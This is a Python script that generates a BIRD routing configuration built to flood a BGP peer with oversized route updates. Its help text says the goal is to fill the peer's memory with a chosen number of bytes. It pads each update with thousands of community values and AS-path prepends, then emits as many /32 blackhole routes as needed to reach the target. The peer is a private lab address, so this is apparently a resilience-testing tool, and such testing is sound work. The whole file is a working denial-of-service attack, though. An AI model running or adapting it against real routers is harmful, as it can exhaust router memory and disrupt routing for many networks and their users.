#! /usr/bin/env python3

import sys
from ipaddress import ip_network

def help():
    print('birdgen.py AMOUNT SUBNET AS')
    print('This script will create a BIRD configuration to send out BGP UPDATES which fill up the memory of the BGP peer with AMOUNT bytes of data.')
    print('')
    print('AMOUNT   How many Bytes should be sent to the BGP peer. Value is provided in Byte or with B,KB,MB,GB as suffix.')
    print('SUBNET   Subnet in CIDR notation from which /32 NLRIs should be generated. The script tries to use as less IP addresses as possible.')
    print('AS       The AS number which should be on the leftmost position in the AS-PATH.')

if len(sys.argv) < 4:
    help()
    sys.exit(1)
amount = sys.argv[1]
subnet = ip_network(sys.argv[2])
as_number = sys.argv[3]

if amount.endswith('GB'):
    amount = int(amount.rstrip('GB')) * 1024 * 1024 * 1024
elif amount.endswith('MB'):
    amount = int(amount.rstrip('MB')) * 1024 * 1024
elif amount.endswith('KB'):
    amount = int(amount.rstrip('KB')) * 1024
elif amount.endswith('B'):
    amount = int(amount.rstrip('B'))
else:
    amount = int(amount)
subnet = ip_network(sys.argv[2])

# generic bird config
print("""router id 192.168.122.101;
protocol device {
}
protocol direct {
        disabled;               # Disable by default
        ipv4;                   # Connect to default IPv4 table
        ipv6;                   # ... and to default IPv6 table
}
""")


# filter which adds communities to fill up msg up to 4096 bytes
print("""
filter memFill
{""")
msg_size = 17 # 5 Byte NLRI + 4 Byte for each AS (2 times prepended = 3 times in path) → 5 + 4*3 = 17
i = 1
while msg_size < 3045:
        print(f"    bgp_community.add(({as_number},{i}));")
        msg_size += 4
        i += 1
        if i > 65511:
            i = 1
print("""    bgp_med = 42;
    bgp_path.prepend("""+str(as_number)+""");
    bgp_path.prepend("""+str(as_number)+""");
        accept;
}""")

# generate static routes
print("""protocol static {
        ipv4 {
                export none;
                import all;
        };
""")

addresses = iter(subnet)
total_sent = 0

while total_sent < amount: #3221225472: # 3GB
    print(f"    route {next(addresses)}/32 blackhole;")
    total_sent += msg_size
print("}")

# neighbor configuration
print("""protocol bgp target {
        local as """+str(as_number)+""";
        neighbor 192.168.122.44 as 1000;
        source address 192.168.122.101;

        ipv4 {
                export filter memFill;
                import all;
        };
        ipv6 {
                export all;
                import none;
        };
}""")
